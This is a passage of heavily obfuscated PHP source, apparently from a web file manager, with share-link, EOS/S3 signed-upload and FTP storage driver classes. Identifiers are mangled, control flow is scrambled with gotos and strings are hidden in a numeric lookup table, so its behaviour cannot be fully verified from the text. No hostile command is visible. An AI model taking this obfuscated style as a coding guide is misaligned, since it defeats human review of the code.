'') { goto B§ç¢‰Á¬Ó; cÆ¡êİ: $e§áõ­ğÖ[$eÍºì»±À] = new ModelBase($B¼İèØ•Ùï, $fğ©©»ˆÕÎ, $CŠ’´À±¼ß); return $e§áõ­ğÖ[$eÍºì»±À]; goto Fİ¨ŞÃˆÀ; AÒÍ˜ÛªÓ¦: if (isset($e§áõ­ğÖ[$eÍºì»±À])) { return $e§áõ­ğÖ[$eÍºì»±À]; } if ($B¼İèØ•Ùï) { $B¼İèØ•Ùï = strtoupper($B¼İèØ•Ùï[0]) . substr($B¼İèØ•Ùï, 1); $DšÃ³³Ğ³ = $B¼İèØ•Ùï . $eñ¼–¶º[1]; if (class_exists($DšÃ³³Ğ³)) { $e§áõ­ğÖ[$eÍºì»±À] = new $DšÃ³³Ğ³(); return $e§áõ­ğÖ[$eÍºì»±À]; } } if (!$CŠ’´À±¼ß) { $CŠ’´À±¼ß = $GLOBALS[$eñ¼–¶º[2]][$eñ¼–¶º[3]]; } goto cÆ¡êİ; B§ç¢‰Á¬Ó: $eñ¼–¶º =& $_SERVER[æªÊ«]; static $e§áõ­ğÖ = array(); $eÍºì»±À = strtolower($fğ©©»ˆÕÎ . $eñ¼–¶º[0] . $B¼İèØ•Ùï); goto AÒÍ˜ÛªÓ¦; Fİ¨ŞÃˆÀ: } goto cÙÁº­’; B‹ù³¦œª°: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($f‡™éø¦øÔ) { $this->pathParse = $f‡™éø¦øÔ; } protected function infoParse($CšÒ²¬ƒğù, $A¥ˆ‚îŸëõ = false) { $eÖÏ¥Ç¢« =& $_SERVER[¦·]; return Action($eÖÏ¥Ç¢«[1021])->sharePathInfo($this->pathParse[$eÖÏ¥Ç¢«[75]], !0, $A¥ˆ‚îŸëõ); } public function listPath($e¤ö·£§, $e¡½Ïª¬¯ = false) { $a°è¢¸ˆç =& $_SERVER[¦·]; $aê£àêÄ = IO::listPath($e¤ö·£§, $e¡½Ïª¬¯); foreach ($aê£àêÄ as $d¶á…‰Åé => $C’”ÕîÉĞ­) { if (!in_array($d¶á…‰Åé, array($a°è¢¸ˆç[73], $a°è¢¸ˆç[74]))) { continue; } foreach ($C’”ÕîÉĞ­ as $dˆË¸ ¦¿ => $b·Ñ ¹ãäà) { $b·Ñ ¹ãäà = Action($a°è¢¸ˆç[1138])->parsePathChildren($b·Ñ ¹ãäà, array($a°è¢¸ˆç[387] => $e¤ö·£§)); $aê£àêÄ[$d¶á…‰Åé][$dˆË¸ ¦¿] = Action($a°è¢¸ˆç[1021])->shareItemInfo($b·Ñ ¹ãäà); } } return $aê£àêÄ; } public function listAll($d§’†Ù•óÍ) { $f¢“ÖÀ‹À± =& $_SERVER[¦·]; $cÃË”õÀ¶‰ = IO::listAll($d§’†Ù•óÍ); foreach ($cÃË”õÀ¶‰ as &$C³î”Ş¡æê) { $C³î”Ş¡æê = array_merge(IO::info($C³î”Ş¡æê[$f¢“ÖÀ‹À±[75]]), $C³î”Ş¡æê); $C³î”Ş¡æê[$f¢“ÖÀ‹À±[391]] = Action($f¢“ÖÀ‹À±[1021])->shareItemInfo($C³î”Ş¡æê); } unset($C³î”Ş¡æê); return $cÃË”õÀ¶‰; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($d‹Í»ßÁé¥) { parent::__construct($d‹Í»ßÁé¥); $this->signatureVersion($_SERVER[¦·][200]); } public function uploadFormData($F°áğêîíÊ, $CéÇº‚ŠÁ´ = 3600) { goto A¤¢«•“‹¸; DˆÁË‘®œó: $DñÚ®ğµ£” = $Fù¥êÍÚ[59]; $B„¶•ƒ¤ó = gmdate($Fù¥êÍÚ[1140]); $c–İ‚îÀ˜ = gmdate($Fù¥êÍÚ[691]); goto DŸİ’ñ ”; AğÍ»„Ê•: $b«÷ÏÏ×Ü¡ = array($Fù¥êÍÚ[199] => $Fù¥êÍÚ[33], $Fù¥êÍÚ[1151] => $Fù¥êÍÚ[33], $Fù¥êÍÚ[1107] => $D ¥Ë°Œ, $Fù¥êÍÚ[1111] => $FŒÇîèš, $Fù¥êÍÚ[1115] => $fİ”˜»Ø†, $Fù¥êÍÚ[1152] => $f¯œ³¸÷, $Fù¥êÍÚ[1153] => $E—à™ç ×Î, $Fù¥êÍÚ[1154] => $B„¶•ƒ¤ó, $Fù¥êÍÚ[1155] => $AŸ½ƒ‹¯ÑŒ, $Fù¥êÍÚ[1156] => $aƒ‹œÂ¿Á, $Fù¥êÍÚ[169] => $this->getHost()); return $b«÷ÏÏ×Ü¡; goto a¶Œ¡¬äÃ„; d×Ê•âŠõ¹: $fİ”˜»Ø† = base64_encode(json_encode($c÷Û–¥)); $B‘‰Š©¢Á° = hash_hmac($Fù¥êÍÚ[1149], $c–İ‚îÀ˜, $Fù¥êÍÚ[1150] . $this->secret, !0); $b¦á¹¶‘Ú— = hash_hmac($Fù¥êÍÚ[1149], $this->region, $B‘‰Š©¢Á°, !0); goto cî¤ìïÃ­Í; A¤¢«•“‹¸: $Fù¥êÍÚ =& $_SERVER[¦·]; $D ¥Ë°Œ = $Fù¥êÍÚ[185]; $E—à™ç ×Î = $Fù¥êÍÚ[1139]; goto DˆÁË‘®œó; DŸİ’ñ ”: $D»ÀƒÎƒ©İ = $Fù¥êÍÚ[1141]; $AŸ½ƒ‹¯ÑŒ = $CéÇº‚ŠÁ´ . $Fù¥êÍÚ[33]; $FŒÇîèš = $Fù¥êÍÚ[1103]; goto a‡ÆÔéíÁÂ; a‡ÆÔéíÁÂ: $DŞ‹×÷‡Ù = array($this->accessKey, $c–İ‚îÀ˜, $this->region, $DñÚ®ğµ£”, $D»ÀƒÎƒ©İ); $f¯œ³¸÷ = implode($Fù¥êÍÚ[8], $DŞ‹×÷‡Ù); $c÷Û–¥ = array($Fù¥êÍÚ[1105] => gmdate($Fù¥êÍÚ[1104], strtotime($Fù¥êÍÚ[1142])), $Fù¥êÍÚ[1106] => array(array($Fù¥êÍÚ[1108] => $this->bucket), array($Fù¥êÍÚ[1107] => $D ¥Ë°Œ), array($Fù¥êÍÚ[1109], $Fù¥êÍÚ[1110], $Fù¥êÍÚ[33]), array($Fù¥êÍÚ[1109], $Fù¥êÍÚ[1143], $Fù¥êÍÚ[33]), array($Fù¥êÍÚ[1109], $Fù¥êÍÚ[1144], $Fù¥êÍÚ[33]), array($Fù¥êÍÚ[1111] => $FŒÇîèš), array($Fù¥êÍÚ[1145] => $f¯œ³¸÷), array($Fù¥êÍÚ[1146] => $E—à™ç ×Î), array($Fù¥êÍÚ[1147] => $B„¶•ƒ¤ó), array($Fù¥êÍÚ[1148] => $AŸ½ƒ‹¯ÑŒ))); goto d×Ê•âŠõ¹; cî¤ìïÃ­Í: $B”À…òô§ = hash_hmac($Fù¥êÍÚ[1149], $DñÚ®ğµ£”, $b¦á¹¶‘Ú—, !0); $bÊñÌè’ÓØ = hash_hmac($Fù¥êÍÚ[1149], $D»ÀƒÎƒ©İ, $B”À…òô§, !0); $aƒ‹œÂ¿Á = hash_hmac($Fù¥êÍÚ[1149], $fİ”˜»Ø†, $bÊñÌè’ÓØ); goto AğÍ»„Ê•; a¶Œ¡¬äÃ„: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($dÁ¤‰ğñí) { parent::__construct(); if (count($dÁ¤‰ğñí) > 0) { $this->_init($dÁ¤‰ğñí); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Eª‹Ó †«‡) { $C¤­‚°†î =& $_SERVER[¦·]; global $config; $this->appCharset = $config[$C¤­‚°†î[1157]]; $this->systemCharset = $config[$C¤­‚°†î[1158]]; if (isset($Eª‹Ó †«‡[$C¤­‚°†î[1159]]) && $Eª‹Ó †«‡[$C¤­‚°†î[1159]]) { $this->systemCharset = $Eª‹Ó †«‡[$C¤­‚°†î[1159]]; } } public function iconvApp($E³ƒÈø£Ç„) { return $this->iconvTo($E³ƒÈø£Ç„, $this->systemCharset, $this->appCharset); } public function iconvSystem($bÎÒ²ÂÏã—) { return $this->iconvTo($bÎÒ²ÂÏã—, $this->appCharset, $this->systemCharset); } public function getPathOuter($eÓ÷äÑ÷³Ö) { goto fÖ‹ùÁñÜ«; d†»¨”¨ì±: $eÓ÷äÑ÷³Ö = KodIO::clear($eÓ÷äÑ÷³Ö); $eÓ÷äÑ÷³Ö = substr($eÓ÷äÑ÷³Ö, strlen($cÛæ‰ÙÅ…¾)); if (empty($this->pathDriver)) { return $eÓ÷äÑ÷³Ö; } goto eƒ’Òí¿ŒÑ; eƒ’Òí¿ŒÑ: return $this->pathDriver . $e»Ù ìÃ˜×[8] . ltrim($eÓ÷äÑ÷³Ö, $e»Ù ìÃ˜×[8]); goto E­Ö…˜æã; A É±Òƒ­’: if (substr($cÛæ‰ÙÅ…¾, 0, 2) == $e»Ù ìÃ˜×[1160]) { $cÛæ‰ÙÅ…¾ = BASIC_PATH . substr($cÛæ‰ÙÅ…¾, 2); } if (substr($eÓ÷äÑ÷³Ö, 0, 2) == $e»Ù ìÃ˜×[1160]) { $eÓ÷äÑ÷³Ö = BASIC_PATH . substr($eÓ÷äÑ÷³Ö, 2); } $cÛæ‰ÙÅ…¾ = KodIO::clear($cÛæ‰ÙÅ…¾); goto d†»¨”¨ì±; fÖ‹ùÁñÜ«: $e»Ù ìÃ˜× =& $_SERVER[¦·]; $cÛæ‰ÙÅ…¾ = $this->iconvApp($this->pathBase); $eÓ÷äÑ÷³Ö = $this->iconvApp($eÓ÷äÑ÷³Ö); goto A É±Òƒ­’; E­Ö…˜æã: } private function _init($e¶·¥Ïø°» = array()) { $bÀ³ù¸¿õ =& $_SERVER[¦·]; if (!function_exists($bÀ³ù¸¿õ[1161])) { show_json(LNG($bÀ³ù¸¿õ[1162]), !1); } $this->config = $e¶·¥Ïø°»; $this->charsetReset($e¶·¥Ïø°»); foreach ($e¶·¥Ïø°» as $F‡÷İÊ±ğÒ => $A‚”«Ìø“) { if (isset($this->{$F‡÷İÊ±ğÒ})) { $this->{$F‡÷İÊ±ğÒ} = $A‚”«Ìø“; } } return $this->_login($e¶·¥Ïø°»); } private function _login($eîŠê¸Ôí) { goto b‹›ºóèªÌ; e’İÆŒ´Š“: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $CöÂßß»ÏÅ = $this->pasv == $a÷£„ˆÒ [83] ? !0 : !1; @ftp_pasv($this->connect, $CöÂßß»ÏÅ); goto CÇî‹ëœ•Ğ; Aø¿ˆÄ²ë…: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $béè©Åõî = @ftp_login($this->connect, $this->username, $this->userpass); goto e’İÆŒ´Š“; cåè„ÏÜ·: if (isset($B­íŠã¥ ø[$dËÑ…¹¿í¬])) { foreach ($B­íŠã¥ ø[$dËÑ…¹¿í¬] as $e«Ğ¢ÄçÌ› => $DÛĞĞÕ·) { $this->{$e«Ğ¢ÄçÌ›} = $DÛĞĞÕ·; } return !0; } $CĞ­¬å¾•› = parse_url(trim($this->server, $a÷£„ˆÒ [8])); $this->host = $CĞ­¬å¾•›[$a÷£„ˆÒ [169]]; goto eªÇŸÇóö; eªÇŸÇóö: $aµÅºÜø«Ú = isset($CĞ­¬å¾•›[$a÷£„ˆÒ [168]]) && $CĞ­¬å¾•›[$a÷£„ˆÒ [168]] == $a÷£„ˆÒ [1163] ? !0 : !1; $this->scheme = $aµÅºÜø«Ú ? $a÷£„ˆÒ [1164] : $a÷£„ˆÒ [1165]; $this->port = isset($CĞ­¬å¾•›[$a÷£„ˆÒ [170]]) ? $CĞ­¬å¾•›[$a÷£„ˆÒ [170]] : 21; goto Aø¿ˆÄ²ë…; CÇî‹ëœ•Ğ: $B­íŠã¥ ø[$dËÑ…¹¿í¬] = array($a÷£„ˆÒ [1166] => $this->connect, $a÷£„ˆÒ [169] => $this->host, $a÷£„ˆÒ [168] => $this->scheme, $a÷£„ˆÒ [170] => $this->port); return $béè©Åõî; goto a¤¾šÖ‚ØÅ; b‹›ºóèªÌ: $a÷£„ˆÒ  =& $_SERVER[¦·]; static $B­íŠã¥ ø = array(); $dËÑ…¹¿í¬ = md5(json_encode($eîŠê¸Ôí)); goto cåè„ÏÜ·; a¤¾šÖ‚ØÅ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($aÖÜÛ«À·á, $aÆ³¸Õ™†ç = '', $cîÁÖ¸çáÒ = REPEAT_RENAME) { if ($this->setContent($aÖÜÛ«À·á, $aÆ³¸Õ™†ç)) { return $this->getPathOuter($aÖÜÛ«À·á); } return !1; } public function mkdir($Eª‰ĞÓÖÔÅ, $DÁŒš°£á = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Eª‰ĞÓÖÔÅ = $this->iconvSystem($Eª‰ĞÓÖÔÅ); if ($this->isFolder($Eª‰ĞÓÖÔÅ) || @ftp_mkdir($this->connect, $Eª‰ĞÓÖÔÅ)) { return $this->getPathOuter($Eª‰ĞÓÖÔÅ); } if (!$this->mkdir($this->pathFather($Eª‰ĞÓÖÔÅ))) { return !1; } if ($Eª‰ĞÓÖÔÅ = @ftp_mkdir($this->connect, $Eª‰ĞÓÖÔÅ)) { return $this->getPathOuter($Eª‰ĞÓÖÔÅ); } return !1; } public function copyFile($C²Ìœ²È«Š, $f¹¼†Ì÷ßø) { goto A¾º©ŞÌšâ; f„Ô´ÛØ: $Dø‚±„â¶ = $this->iconvApp($AƒÁ°‚“—¥); $this->download($C²Ìœ²È«Š, $Dø‚±„â¶); $f¬İäÑİË¡ = $this->upload($f¹¼†Ì÷ßø, $Dø‚±„â¶); goto D…¨Ü‘ïóŠ; A¾º©ŞÌšâ: if (!$this->_isconn()) { return !1; } $ašŞ’Ø½„£ = $this->pathThis($this->iconvSystem($C²Ìœ²È«Š)); $AƒÁ°‚“—¥ = $this->tempFile($ašŞ’Ø½„£); goto f„Ô´ÛØ; D…¨Ü‘ïóŠ: $this->tempFileRemve($AƒÁ°‚“—¥); return $f¬İäÑİË¡; goto CÒª¥ØôÈÀ; CÒª¥ØôÈÀ: } public function moveFile($Eòª‰†Û, $fÌĞ­ºÓ÷) { if (!$this->_isconn()) { return !1; } $Eòª‰†Û = $this->iconvSystem($Eòª‰†Û); $fÌĞ­ºÓ÷ = $this->iconvSystem($fÌĞ­ºÓ÷); $dêŒã¹¶ÜÀ = @ftp_rename($this->connect, $Eòª‰†Û, $fÌĞ­ºÓ÷); return $dêŒã¹¶ÜÀ ? $this->getPathOuter($fÌĞ­ºÓ÷) : !1; } public function delFile($bŠ®¹¹ÉÍ) { if (!$this->_isconn()) { return !1; } $bŠ®¹¹ÉÍ = $this->iconvSystem($bŠ®¹¹ÉÍ); return @ftp_delete($this->connect, $bŠ®¹¹ÉÍ); } public function delFolder($D¾‡´‹ö„È) { if (!$this->_isconn()) { return !1; } $D¾‡´‹ö„È = $this->iconvSystem($D¾‡´‹ö„È); $e·´ªÓÊº = $this->ftpList($D¾‡´‹ö„È); if (!$e·´ªÓÊº) { return @ftp_rmdir($this->connect, $D¾‡´‹ö„È); } foreach ($e·´ªÓÊº as $a„ˆ‹Éôñ) { if ($this->isFolder($a„ˆ‹Éôñ)) { $a„ˆ‹Éôñ = $this->iconvApp($a„ˆ‹Éôñ); $this->delFolder($a„ˆ‹Éôñ); } else { @ftp_delete($this->connect, $a„ˆ‹Éôñ); } } return @ftp_rmdir($this->connect, $D¾‡´‹ö„È); } public function rename($f»ÜŞ‡ß‘¾, $D¨¤óÃğ¿Â) { goto e’¥³›µÙ—; b®Î´ñŸ°: $D„ÕÓêÖ = $this->iconvSystem($D„ÕÓêÖ); $f»ÜŞ‡ß‘¾ = $this->iconvSystem($f»ÜŞ‡ß‘¾); $DˆŠÀ˜Ø = $this->pathFather($f»ÜŞ‡ß‘¾); goto B»øêÄŸ; B»øêÄŸ: $a¡—§Éœ´‡ = rtrim($DˆŠÀ˜Ø, $A¹ìÌŠ†Çê[8]) . $A¹ìÌŠ†Çê[8] . $D„ÕÓêÖ; $b„ó×ÍÒÑò = @ftp_rename($this->connect, $f»ÜŞ‡ß‘¾, $a¡—§Éœ´‡); $a¡—§Éœ´‡ = $this->iconvApp($a¡—§Éœ´‡); goto F˜ŒÒŒÕ­å; F˜ŒÒŒÕ­å: return $b„ó×ÍÒÑò ? $this->getPathOuter($a¡—§Éœ´‡) : !1; goto eÙ©’àÄ; e’¥³›µÙ—: $A¹ìÌŠ†Çê =& $_SERVER[¦·]; if (!$this->_isconn()) { return !1; } $D„ÕÓêÖ = $this->fileNameAuto($this->pathFather($f»ÜŞ‡ß‘¾), $D¨¤óÃğ¿Â); goto b®Î´ñŸ°; eÙ©’àÄ: } private function folderInfo($F¦¥ŠÎ„ƒ¡, $DÉˆ¢›à› = false) { goto EËî‡ÎÙÔ—; BóÈ¤İ¨å: return $CŒ–ğ‹Å‰; goto cá§éˆ³·Ø; EËî‡ÎÙÔ—: $bŠùé×§ÛÔ =& $_SERVER[¦·]; $fÂÛ¯†Ò­ = $this->getPathOuter(rtrim($F¦¥ŠÎ„ƒ¡, $bŠùé×§ÛÔ[8])); $Bò•”ªÓÑ§ = $this->pathThis($fÂÛ¯†Ò­); goto CÇ„©ÔÊ¨; CÇ„©ÔÊ¨: $e¬½µîõ = $this->iconvSystem($F¦¥ŠÎ„ƒ¡); if ($DÉˆ¢›à›) { return array($bŠùé×§ÛÔ[28] => $Bò•”ªÓÑ§, $bŠùé×§ÛÔ[75] => $fÂÛ¯†Ò­, $bŠùé×§ÛÔ[29] => $bŠùé×§ÛÔ[76]); } $CŒ–ğ‹Å‰ = array($bŠùé×§ÛÔ[28] => $Bò•”ªÓÑ§, $bŠùé×§ÛÔ[75] => $fÂÛ¯†Ò­, $bŠùé×§ÛÔ[29] => $bŠùé×§ÛÔ[76], $bŠùé×§ÛÔ[187] => 0, $bŠùé×§ÛÔ[107] => 0, $bŠùé×§ÛÔ[1167] => !0, $bŠùé×§ÛÔ[1168] => !0); goto BóÈ¤İ¨å; cá§éˆ³·Ø: } private function fileInfo($aù†¥óÀ‚ó, $Eàâåº×óÄ = false) { goto E›Ù—ÙªÍ¦; E›Ù—ÙªÍ¦: $aÔì•ã¬¾— =& $_SERVER[¦·]; $fÙµ©‡µ¹Ï = $this->getPathOuter(rtrim($aù†¥óÀ‚ó, $aÔì•ã¬¾—[8])); $e…¬Šöøà = $this->pathThis($fÙµ©‡µ¹Ï); goto AêÜŸÎˆ¾Ë; FìÉíµ‡×: $CÑØ‰®Œ¼‘[$aÔì•ã¬¾—[107]] = $CÑØ‰®Œ¼‘[$aÔì•ã¬¾—[107]] > 0 ? $CÑØ‰®Œ¼‘[$aÔì•ã¬¾—[107]] : 0; return $CÑØ‰®Œ¼‘; goto A”ç×¨ù´; AêÜŸÎˆ¾Ë: $C¼ˆÚ¼Šâè = $this->iconvSystem($aù†¥óÀ‚ó); if ($Eàâåº×óÄ) { return array($aÔì•ã¬¾—[28] => $e…¬Šöøà, $aÔì•ã¬¾—[75] => $fÙµ©‡µ¹Ï, $aÔì•ã¬¾—[29] => $aÔì•ã¬¾—[167], $aÔì•ã¬¾—[160] => $this->ext($aù†¥óÀ‚ó), $aÔì•ã¬¾—[77] => $this->size($aù†¥óÀ‚ó)); } $CÑØ‰®Œ¼‘ = array($aÔì•ã¬¾—[28] => $e…¬Šöøà, $aÔì•ã¬¾—[75] => $fÙµ©‡µ¹Ï, $aÔì•ã¬¾—[29] => $aÔì•ã¬¾—[167], $aÔì•ã¬¾—[187] => 0, $aÔì•ã¬¾—[107] => @ftp_mdtm($this->connect, $C¼ˆÚ¼Šâè), $aÔì•ã¬¾—[160] => $this->ext($aù†¥óÀ‚ó), $aÔì•ã¬¾—[77] => $this->size($aù†¥óÀ‚ó), $aÔì•ã¬¾—[1167] => !0, $aÔì•ã¬¾—[1168] => !0); goto FìÉíµ‡×; A”ç×¨ù´: } public function size($aÎœ‚»ìÉ) { $eš¹°ñ‚óò = $this->objectMeta($aÎœ‚»ìÉ); return $eš¹°ñ‚óò ? $eš¹°ñ‚óò[$_SERVER[¦·][77]] : 0; } public function info($c«š›ÌÚ­) { if ($this->isFile($c«š›ÌÚ­)) { return $this->fileInfo($c«š›ÌÚ­, 0); } else { if ($this->isFolder($c«š›ÌÚ­)) { return $this->folderInfo($c«š›ÌÚ­); } } return !1; } public function exist($a§£´©²¶) { return $this->objectMeta($a§£´©²¶) ? !0 : !1; } public function isFile($A¼×†´Äöë) { $d¨à­Œø©’ =& $_SERVER[¦·]; $fœ µŸÏğÜ = $this->objectMeta($A¼×†´Äöë); return $fœ µŸÏğÜ ? $fœ µŸÏğÜ[$d¨à­Œø©’[29]] == $d¨à­Œø©’[167] : !1; } public function isFolder($EÇ¶…£ë‚©) { $aÉ“´ÑµÎÈ =& $_SERVER[¦·]; $dœ·Œ²‹…¿ = $this->objectMeta($EÇ¶…£ë‚©); return $dœ·Œ²‹…¿ ? $dœ·Œ²‹…¿[$aÉ“´ÑµÎÈ[29]] == $aÉ“´ÑµÎÈ[76] : !1; } public function listPath($f¼˜­‹ø½è, $e¡ĞÎùÓ– = false) { goto AæÏ¸¢½Ã¹; c«Äƒ‚š•…: $cçˆøìÔ¹Ò = $this->ftpList($f¼˜­‹ø½è); $FÈ“áØñš = array($d´ÉºŸâÈ£[74] => array(), $d´ÉºŸâÈ£[73] => array()); if (!$cçˆøìÔ¹Ò) { return $FÈ“áØñš; } goto aÈùª¥ğö‰; aÈùª¥ğö‰: foreach ($cçˆøìÔ¹Ò as $f¼˜­‹ø½è) { if ($this->isFolder($f¼˜­‹ø½è)) { $FÈ“áØñš[$d´ÉºŸâÈ£[74]][] = $this->folderInfo($f¼˜­‹ø½è, $e¡ĞÎùÓ–); } else { $FÈ“áØñš[$d´ÉºŸâÈ£[73]][] = $this->fileInfo($f¼˜­‹ø½è, $e¡ĞÎùÓ–); } } return $FÈ“áØñš; goto d¦ÆŒµÚéæ; AæÏ¸¢½Ã¹: $d´ÉºŸâÈ£ =& $_SERVER[¦·]; if (!$this->_isconn()) { return !1; } $f¼˜­‹ø½è = $this->iconvSystem($f¼˜­‹ø½è); goto c«Äƒ‚š•…; d¦ÆŒµÚéæ: } public function has($d±İñÂ„Å¡, $cÅ„½Ğƒ†ˆ = false, $A¢¼ÒŞ™ = true) { goto cïÇÉºƒ; eö·…œÀª‰: $A¡¾Ğø¿ˆÁ = $this->ftpList($d±İñÂ„Å¡); if (!$A¡¾Ğø¿ˆÁ) { return !1; } if ($cÅ„½Ğƒ†ˆ) { return array($eĞòÑ¡—‡[191] => 0, $eĞòÑ¡—‡[192] => count($A¡¾Ğø¿ˆÁ)); } goto bŒ‚âæàŠ½; cïÇÉºƒ: $eĞòÑ¡—‡ =& $_SERVER[¦·]; if (!$this->_isconn()) { return !1; } $d±İñÂ„Å¡ = $this->iconvSystem($d±İñÂ„Å¡); goto eö·…œÀª‰; bŒ‚âæàŠ½: foreach ($A¡¾Ğø¿ˆÁ as $d±İñÂ„Å¡) { if ($A¢¼ÒŞ™) { if (!$this->isFolder($d±İñÂ„Å¡)) { return !0; } } else { if ($this->isFolder($d±İñÂ„Å¡)) { return !0; } } } return !1; goto e‡ó“—£øë; e‡ó“—£øë: } public function listAll($CÏ…â†ĞØ˜) { goto bÊÌö‡¬«¨; bÊÌö‡¬«¨: $aµäÜöŸ =& $_SERVER[¦·]; if (!$this->_isconn()) { return !1; } $CÏ…â†ĞØ˜ = $this->iconvSystem($CÏ…â†ĞØ˜); goto B…ŒÈà¢Î; EÌˆÉÔ±§‰: foreach ($fè­ŒëÜªÍ[$aµäÜöŸ[74]] as $C÷¹ªó§é·) { $fæ›‰­ö·è[] = array($aµäÜöŸ[75] => $aµäÜöŸ[8] . trim(str_replace($CÏ…â†ĞØ˜, $aµäÜöŸ[33], $C÷¹ªó§é·), $aµäÜöŸ[8]) . $aµäÜöŸ[8], $aµäÜöŸ[76] => 1, $aµäÜöŸ[77] => 0); } foreach ($fè­ŒëÜªÍ[$aµäÜöŸ[73]] as $E¾ºÛ‹²À¢) { $fæ›‰­ö·è[] = array($aµäÜöŸ[75] => $aµäÜöŸ[8] . trim(str_replace($CÏ…â†ĞØ˜, $aµäÜöŸ[33], $E¾ºÛ‹²À¢), $aµäÜöŸ[8]), $aµäÜöŸ[76] => 0, $aµäÜöŸ[77] => $this->size($E¾ºÛ‹²À¢)); } return $fæ›‰­ö·è; goto F¤ÂÆƒ“ŒÑ; B…ŒÈà¢Î: $fè­ŒëÜªÍ = array($aµäÜöŸ[73] => array(), $aµäÜöŸ[74] => array()); $this->recursionFtpFiles($CÏ…â†ĞØ˜, $fè­ŒëÜªÍ); $fæ›‰­ö·è = array(); goto EÌˆÉÔ±§‰; F¤ÂÆƒ“ŒÑ: } public function getContent($B¤İ¼ò‰Àé) { if (!$this->_isconn()) { return !1; } $B¤İ¼ò‰Àé = $this->iconvSystem($B¤İ¼ò‰Àé); return $this->fileSubstr($B¤İ¼ò‰Àé); } public function setContent($a÷…­÷î‡, $aè‰”ÍÀ¼Å = '') { goto E½ùÁ±’­Ÿ; E½ùÁ±’­Ÿ: if (!$this->_isconn()) { return !1; } $FİË•»Ë«Ï = $this->pathThis($this->iconvSystem($a÷…­÷î‡)); $e¡áŸ†ÁÊ‰ = $this->tempFile($FİË•»Ë«Ï); goto Bé§®šè‰¬; Bé§®šè‰¬: file_put_contents($e¡áŸ†ÁÊ‰, $aè‰”ÍÀ¼Å); $C–“ø¦˜ÚŒ = $this->upload($a÷…­÷î‡, $this->iconvApp($e¡áŸ†ÁÊ‰)); $this->tempFileRemve($e¡áŸ†ÁÊ‰); goto f÷ÎÚ¬Úœ; f÷ÎÚ¬Úœ: return $C–“ø¦˜ÚŒ; goto CßŒöÊå™Ó; CßŒöÊå™Ó: } public function fileSubstr($cá•¸ñÕŸµ, $F«½ÙÁ‚¾ = 0, $f„·ğ‰ğãÌ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($cá•¸ñÕŸµ, $F«½ÙÁ‚¾, $f„·ğ‰ğãÌ); } private function ftpRequest($EõâÁÏÈÚÙ, $A‚ó©ê†«ä = 0, $f²‘Ÿëä× = false) { goto aˆÁ¶º·§; F‘ˆÄæîà: curl_setopt($cÙ”÷—æŸ¡, CURLOPT_URL, $AÛ§¦½êŞì . $this->pathEncode($EõâÁÏÈÚÙ)); curl_setopt($cÙ”÷—æŸ¡, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($f²‘Ÿëä×) { $f£›âÎí§¸ = $A‚ó©ê†«ä + $f²‘Ÿëä× - 1; curl_setopt($cÙ”÷—æŸ¡, CURLOPT_RANGE, "{$A‚ó©ê†«ä}\x2d{$f£›âÎí§¸}"); } goto e‘ê“‹ÂÅ; aˆÁ¶º·§: $EõâÁÏÈÚÙ = $this->iconvSystem($EõâÁÏÈÚÙ); $AÛ§¦½êŞì = $this->scheme . $this->host . $_SERVER[¦·][4] . $this->port; $cÙ”÷—æŸ¡ = curl_init(); goto F‘ˆÄæîà; e‘ê“‹ÂÅ: curl_setopt($cÙ”÷—æŸ¡, CURLOPT_RETURNTRANSFER, 1); $B¾ªˆµ²³ = curl_exec($cÙ”÷—æŸ¡); curl_close($cÙ”÷—æŸ¡); goto eÉØÚó®ˆ; eÉØÚó®ˆ: return $B¾ªˆµ²³; goto C‚ç‘¨­; C‚ç‘¨­: } public function upload($e›Ó”êÛà”, $dœòÜ‡°áÑ, $AÓØ–ŸŞ»„ = false, $aÑ¦ËÆ¿¯Á = REPEAT_REPLACE) { goto A¼ÕÑ˜Âè; A¼ÕÑ˜Âè: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($e›Ó”êÛà”))) { return !1; } $e›Ó”êÛà” = $this->iconvSystem($e›Ó”êÛà”); goto c…®œÎŒ; e©—Ç¦´½÷: if ($e£©İ¡Ù§ç != FTP_FINISHED) { return !1; } return $this->getPathOuter($e›Ó”êÛà”); goto Fùæ°­‡©Ù; c…®œÎŒ: $dœòÜ‡°áÑ = $this->iconvSystem($dœòÜ‡°áÑ); $e£©İ¡Ù§ç = ftp_nb_put($this->connect, $e›Ó”êÛà”, $dœòÜ‡°áÑ, FTP_BINARY); while ($e£©İ¡Ù§ç == FTP_MOREDATA) { $e£©İ¡Ù§ç = ftp_nb_continue($this->connect); } goto e©—Ç¦´½÷; Fùæ°­‡©Ù: } public function download($dªèî‰Â´É, $dàß‰ğ‹•ë = '') { goto aøñØ˜èšã; Aá‡õ²ß§ç: while ($B‡‡Ôèƒ” == FTP_MOREDATA) { $B‡‡Ôèƒ” = ftp_nb_continue($this->connect); } if ($B‡‡Ôèƒ” != FTP_FINISHED) { return !1; } return $this->iconvApp($dàß‰ğ‹•ë); goto B„ôØï®÷; a°ßß··…ä: $dªèî‰Â´É = $this->iconvSystem($dªèî‰Â´É); $dàß‰ğ‹•ë = $this->iconvSystem($dàß‰ğ‹•ë); $B‡‡Ôèƒ” = ftp_nb_get($this->connect, $dàß‰ğ‹•ë, $dªèî‰Â´É, FTP_BINARY); goto Aá‡õ²ß§ç; aøñØ˜èšã: if (!$this->_isconn()) { return !1; } $Fß˜ªùÒÙ“ = $this->pathFather($dàß‰ğ‹•ë); if (!IO::mkdir($Fß˜ªùÒÙ“)) { return !1; } goto a°ßß··…ä; B„ôØï®÷: } private function ftpList($dâÄÜäçÎã) { goto dù®Šµ˜©¿; a¦ÙöÚÌÖ¦: $B­éÊ¯‰½ = array_diff($B­éÊ¯‰½, array($Eİ©‘ôß‹Ù[91], $Eİ©‘ôß‹Ù[1170], 